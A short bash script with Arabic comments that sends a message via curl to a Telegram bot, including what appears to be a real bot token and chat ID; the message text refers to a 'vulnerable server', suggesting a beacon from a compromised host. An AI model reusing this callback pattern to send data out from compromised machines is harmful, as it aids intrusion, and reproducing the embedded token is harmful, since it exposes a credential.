#!/bin/bash
# متغيرات تحتوي على معلومات بوت تيليجرام
BOT_TOKEN="7073428100:AAGB7QA-tMzCp9sAwXNYZAHu8UsjkFVOiWs"
CHAT_ID="890023590"
MESSAGE="This is a test message from the vulnerable server."

# أمر لإرسال الرسالة إلى بوت تيليجرام باستخدام `curl`
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID&text=$MESSAGE"
